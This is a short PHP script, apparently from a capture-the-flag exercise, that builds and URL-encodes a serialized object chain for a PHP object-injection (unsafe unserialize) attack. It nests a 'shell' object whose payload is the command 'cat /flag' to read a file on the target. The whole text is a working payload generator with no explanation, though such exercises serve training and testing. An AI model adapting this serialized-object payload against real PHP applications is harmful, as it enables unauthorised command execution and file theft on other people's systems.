<?php
class good {
    protected $a;
    function __construct() {
        $this->a = new shell();
    }
}
class shell {
    private $data = "cat /flag";
}
echo urlencode(serialize(new good()));
